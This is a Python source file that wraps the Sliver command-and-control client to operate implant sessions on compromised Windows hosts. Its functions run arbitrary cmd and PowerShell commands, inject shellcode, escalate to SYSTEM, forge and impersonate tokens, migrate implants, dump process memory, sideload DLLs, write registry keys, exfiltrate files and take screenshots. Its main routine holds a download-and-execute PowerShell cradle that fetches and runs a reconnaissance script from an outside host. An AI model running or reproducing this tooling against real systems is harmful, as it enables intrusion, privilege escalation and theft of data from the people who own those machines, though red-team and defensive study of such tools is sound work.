#!/usr/bin/python3

import os
import re
import asyncio
from sliver import SliverClientConfig, SliverClient
from datetime import datetime


class SliverExecutor:
    def __init__(self, config_path=None, config=None):
        """
        It sets up the initial state by assigning values to instance attributes.
        """
        if config:
            self.config_path = config["sliver"]["client_config_file"]
        else:
            self.config_path = config_path

        self.config = SliverClientConfig.parse_config_file(self.config_path)
        self.client = SliverClient(self.config)
        self.output_dir = "/home/kali/Downloads"
        self.timestamp = datetime.now().strftime("%Y%m%d%H%M%S")

    async def print_sessions(self):
        """Async client connect example"""
        await self.client.connect()
        sessions = await self.client.sessions()
        print("Sessions: %r" % sessions)

    async def select_sessions(self):
        """Async client connect example"""
        await self.client.connect()
        sessions = await self.client.sessions()
        if not sessions:
            print("No active sessions found.")
            return None

        print("Available Sessions:")
        for idx, session in enumerate(sessions):
            print(
                f"[{idx}] {session.ID} - {session.Name}@{session.Hostname} ({session.OS})"
            )

        while True:
            try:
                choice = input("Select session number: ")
                selected_idx = int(choice)
                if 0 <= selected_idx < len(sessions):
                    selected_session = sessions[selected_idx]
                    return selected_session.ID
                else:
                    print("Invalid selection. Please try again.")
            except ValueError:
                print("Invalid input. Please enter a number.")

    async def ls(self, session_id):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        ls = await session.ls()  # <-- Returns an Ls Protobuf object
        print("Listing directory contents of: %s" % ls.Path)
        for fi in ls.Files:
            print("FileName: %s (dir: %s, size: %d)" % (fi.Name, fi.IsDir, fi.Size))

    async def whoami(self, session_id):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        exec_result = await session.execute("whoami", [], True)
        print("Exec %r" % exec_result)

    # async def cmd(self, session_id):
    #     await self.client.connect()
    #     session = await self.client.interact_session(
    #         session_id
    #     )  # <-- Create InteractiveSession object
    #     exec_result = await session.execute("cmd.exe", ["\\c", "dir"], True)
    #     print(type(exec_result))
    #     print("Exec %r" % exec_result)

    async def cmd(self, session_id, input_commands):
        try:
            # Connect to the client
            await self.client.connect()

            # Interact with the specified session
            session = await self.client.interact_session(session_id)

            # Split the input commands into individual commands by newlines
            command_list = [
                cmd.strip() for cmd in input_commands.splitlines() if cmd.strip()
            ]

            # Initialize a list to store results
            results = []

            # Execute each command and collect the output
            for command in command_list:
                print(f"Executing: {command}")
                exec_result = await session.execute("cmd.exe", ["/c", command], True)
                results.append(exec_result)
                print(f"Output:\n{exec_result}\n")

            return results

        except Exception as e:
            # Handle exceptions and return an error message
            print(f"An error occurred: {e}")
            return {"error": str(e)}

    async def powershell(self, session_id, input_commands):
        """
        Execute one or more PowerShell commands in the specified session.

        :param session_id: The ID of the active Sliver session.
        :param commands: A string containing one or more PowerShell commands (can be multi-line).
        :return: A list of results for each command executed.
        """
        try:
            # Connect to the Sliver server
            await self.client.connect()

            # Create an interactive session
            session = await self.client.interact_session(session_id)

            # Split the input commands into individual lines
            command_list = [
                cmd.strip() for cmd in input_commands.splitlines() if cmd.strip()
            ]

            # Initialize a list to store results
            results = []

            # Execute each command and collect the output
            for command in command_list:
                print(f"Executing: {command}")
                exec_result = await session.execute(
                    "powershell.exe", ["-Command", command], True
                )
                results.append(exec_result)
                print(f"Output:\n{exec_result}\n")

            return results

        except Exception as e:
            print(f"An error occurred: {e}")
            return None

    async def msf(self, session_id, payload, lhost, lport):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        await session.msf(payload, lhost, lport, "", 1)

    async def call_extension(self, session_id, name, export, ext_args):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        call_extension = await session.call_extension(name, export, ext_args)
        print("Calling extension: %s, export: %s" % (name, export))
        print("Extension Response: %s" % call_extension)

    async def cd(self, session_id, remote_path):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        pwd = await session.cd(remote_path)  # <-- Returns a pwd protobuf object
        print("Changed working directory to: %s" % remote_path)
        print("Current directory: %s" % pwd.Path)

    async def download(self, session_id, remote_path, recurse=False):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        download = await session.download(remote_path, recurse)
        filename = os.path.basename(remote_path)
        output_path = os.path.join(self.output_dir, filename)
        with open(output_path, "wb") as f:
            f.write(download.Data)
            print(f"File saved to: {output_path}")

    async def execute(self, session_id, exe, args, output=True):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        execute_result = await session.execute(exe, args, output)
        print("execute_result: %r" % execute_result)

    async def execute_assembly(
        self,
        session_id,
        assembly,
        arguments,
        process,
        is_dll,
        arch,
        class_name,
        method,
        app_domain,
    ):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        execute_assembly_result = await session.execute_assembly(
            assembly, arguments, process, is_dll, arch, class_name, method, app_domain
        )
        print("Execute Assembly result: %r" % execute_assembly_result)

    async def execute_shellcode(self, session_id, data, rwx, pid, encoder=""):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        task_result = await session.execute_shellcode(
            data, rwx, pid, encoder
        )  # <-- Returns a Task Protobuf object
        print("Shellcode execution result: %r" % task_result)

    async def get_env(self, session_id, name):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        env_info = await session.get_env(name)  # <-- Returns an EnvInfo Protobuf object
        print("Environment variable: %s" % (env_info))

    async def get_system(self, session_id, hosting_process, config):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        GetSystem = await session.get_system(hosting_process, config)
        print("Attempting to gain SYSTEM privileges via process: %s" % hosting_process)
        print("Exec %r" % GetSystem)

    async def ifconfig(self, session_id):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        ifconfig = await session.ifconfig()
        print("Network Interface Configuration: %s" % ifconfig)

    async def impersonate(self, session_id, username):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        impersonate = await session.impersonate(username)
        print("Impersonate result: %s" % impersonate)

    async def list_extensions(self, session_id):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        listex = (
            await session.list_extensions()
        )  # <-- Returns a ListExtensions Protobuf object
        print("Listing extensions:")
        for ext in listex.Extensions:
            print("Extension: %s" % ext.Name)

    async def make_token(self, session_id, username, password, domain):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        MakeToken = await session.make_token(
            username, password, domain
        )  # <-- Returns a MakeToken Protobuf object
        print("Created token for user: %s" % username)
        print("Token: %r" % MakeToken)

    async def migrate(self, session_id, pid, config):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        Migrate = await session.migrate(
            pid, config
        )  # <-- Returns a Migrate Protobuf object
        print("Migrate implant to process ID: %d" % pid)
        print("Exec: %r" % Migrate)

    async def mkdir(self, session_id, remote_path):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        mkdir = await session.mkdir(remote_path)  # <-- Returns a Mkdir Protobuf object
        print("Make directory: %s" % mkdir)

    async def msf_remote(self, session_id, payload, lhost, lport, pid):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        await session.msf_remote(payload, lhost, lport, pid)

    async def netstat(self, session_id, tcp, udp, ipv4, ipv6, listening=True):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        netstat = await session.netstat(tcp, udp, ipv4, ipv6, listening)
        print("Network connections information:")
        for entry in netstat.Entries:
            print("%s" % entry)

    async def ping(self, session_id):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        ping = await session.ping()  # <-- Send ping and get a Ping Protobuf object
        print("Ping result: %r" % ping)

    async def process_dump(self, session_id, pid):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        ProcessDump = await session.process_dump(pid)
        print("Dump a remote process memory: %r" % ProcessDump)

    async def ps(self, session_id):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        processes = await session.ps()  # <-- List processes and get Ps Protobuf object

        print("Listing processes on the remote system:")
        for proc in processes:
            print("PID: %d, Executable: %s" % (proc.Pid, proc.Executable))

    async def pwd(self, session_id):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        pwd = await session.pwd()
        print("Current working directory: %s" % pwd.Path)

    async def register_extension(self, session_id, name, data, goos, init):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        register_extension = await session.register_extension(name, data, goos, init)
        print("Extension registered:: %s" % register_extension)

    async def registry_create_key(self, session_id, hive, reg_path, key, hostname):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        registry_create_key = await session.registry_create_key(
            hive, reg_path, key, hostname
        )
        print("Registry Key Created: %s" % registry_create_key)

    async def registry_read(self, session_id, hive, reg_path, key, hostname):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        RegistryRead = await session.registry_read(hive, reg_path, key, hostname)
        print("Registry Read Value: %s" % RegistryRead)

    async def registry_write(
        self,
        session_id,
        hive,
        reg_path,
        key,
        hostname,
        string_value,
        byte_value,
        dword_value,
        qword_value,
        reg_type,
    ):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        RegistryWrite = await session.registry_write(
            hive,
            reg_path,
            key,
            hostname,
            string_value,
            byte_value,
            dword_value,
            qword_value,
            reg_type,
        )
        print("Registry Write: %s" % RegistryWrite)

    async def revert_to_self(self, session_id):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        RevToSelf = await session.revert_to_self()
        print("Revert to self result: %s" % RevToSelf)

    async def rm(self, session_id, remote_path, recursive=False, force=False):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        rm = await session.rm(remote_path, recursive, force)
        print("Remove result for %s: %s" % (remote_path, rm))

    async def run_as(self, session_id, username, process_name, args):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        RunAs = await session.run_as(username, process_name, args)
        print("Run process as %s: %s" % (username, RunAs))

    async def screenshot(self, session_id):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        Screenshot = await session.screenshot()
        filename = f"screenshot_{self.timestamp}.png"
        output_path = os.path.join(self.output_dir, filename)
        with open(output_path, "wb") as f:
            f.write(Screenshot.Data)
            print(f"Screenshot saved to {output_path}")

    async def set_env(self, session_id, key, value):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        SetEnv = await session.set_env(key, value)
        print("Set: %s" % SetEnv)
        print("Environment variable set: %s=%s" % (key, value))

    async def sideload(
        self, session_id, data, process_name, arguments, entry_point, kill
    ):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        Sideload = await session.sideload(
            data, process_name, arguments, entry_point, kill
        )
        print("Sideload process: %s" % Sideload)

    async def spawn_dll(
        self, session_id, data, process_name, arguments, entry_point, kill
    ):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        SpawnDll = await session.spawn_dll(
            data, process_name, arguments, entry_point, kill
        )
        print("DLL spawn: %s" % SpawnDll)

    async def terminate(self, session_id, pid, force=False):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        Terminate = await session.terminate(pid, force)
        print("Terminate result: %s" % Terminate)

    async def unset_env(self, session_id, key):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        UnSetEnv = await session.unset_env(key)
        print("Environment variable unset: %s" % UnSetEnv)

    async def upload(self, session_id, remote_path, data, is_ioc=False):
        await self.client.connect()
        session = await self.client.interact_session(
            session_id
        )  # <-- Create InteractiveSession object
        Upload = await session.upload(remote_path, data, is_ioc)
        print("Upload result: %s" % Upload)
        if Upload:
            print("Data uploaded to: %s" % remote_path)

    async def cat(self, session_id, remote_path, timeout=60):
        try:
            await self.client.connect()
            session = await self.client.interact_session(session_id)

            # Download the file content (similar to 'download' but without saving to disk)
            download_result = await asyncio.wait_for(
                session.download(remote_path, recurse=False), timeout=timeout
            )

            # Extract the file content from the result
            file_content = download_result.Data
            try:
                decoded_content = file_content.decode("utf-8")
            except UnicodeDecodeError:
                decoded_content = file_content.decode("latin-1", errors="replace")

            # Print the content to the console
            print(f"Contents of {remote_path}:\n{'='*40}")
            print(decoded_content)
            print("=" * 40)
        except asyncio.TimeoutError:
            print(f"Error: Command timed out after {timeout} seconds.")
        except Exception as e:
            print(f"Error reading file: {str(e)}")


async def main():
    sliver_exe = SliverExecutor(
        "/home/kali/Desktop/xiangmu/attack_executor-main/zer0cool.cfg"
    )
    # session display
    session_id = await sliver_exe.select_sessions()
    commands = """
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')
        Invoke-Seatbelt -Command "-group=all"
    """
    # Examples
    # await sliver_exe.print_sessions(session_id)
    # await sliver_exe.ls(session_id)
    # await sliver_exe.whoami(session_id)
    # await sliver_exe.cmd(session_id, commands)
    # await sliver_exe.print_sessions(session_id)
    # await sliver_exe.screenshot(session_id)
    # await sliver_exe.whoami(session_id)
    # await sliver_exe.powershell(session_id, commands=commands)
    # await sliver_exe.download(session_id,'C:\\Users\\Attacker\\Desktop\\test.txt')
    # await sliver_exe.cd(session_id, 'C:\\Users\\Attacker\\Desktop')
    # await sliver_exe.call_extension(session_id, 'ls', 'GetFiles','C:\\Users')
    # await sliver_exe.netstat(
    #     session_id=session_id,
    #     tcp=True,
    #     udp=False,
    #     ipv4=True,
    #     ipv6=False,
    #     listening=True,
    # )
    # await sliver_exe.terminate(session_id, 5556)
    # await sliver_exe.cat(session_id, "c:/users/vagrant/desktop/test/2.txt")


if __name__ == "__main__":
    asyncio.run(main())
